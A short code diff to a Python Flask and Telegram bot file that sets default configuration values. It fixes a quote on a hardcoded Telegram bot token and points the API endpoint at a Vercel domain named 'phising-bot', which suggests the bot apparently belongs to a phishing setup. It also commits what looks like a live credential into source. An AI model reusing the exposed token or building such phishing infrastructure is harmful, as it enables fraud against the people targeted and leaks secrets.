@@ -4,8 +4,8 @@ from flask import Flask, request, jsonify
 from telebot import TeleBot, types
 
 # Replace with your actual bot token and Vercel API endpoint
-BOT_TOKEN = os.environ.get("BOT_TOKEN", "8267518075:AAF4sxPLVF93KG8F8CNVuXQ7MoxgQFAyzOM)
-VERCEL_API_ENDPOINT = os.environ.get("VERCEL_API_ENDPOINT", "https://your-vercel-app-name.vercel.app/api/api") # Your Vercel domain
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8267518075:AAF4sxPLVF93KG8F8CNVuXQ7MoxgQFAyzOM")
+VERCEL_API_ENDPOINT = os.environ.get("VERCEL_API_ENDPOINT", "https://phising-bot-niqc.vercel.app") # Your Vercel domain
 
 bot = TeleBot(BOT_TOKEN)
 app = Flask(__name__)
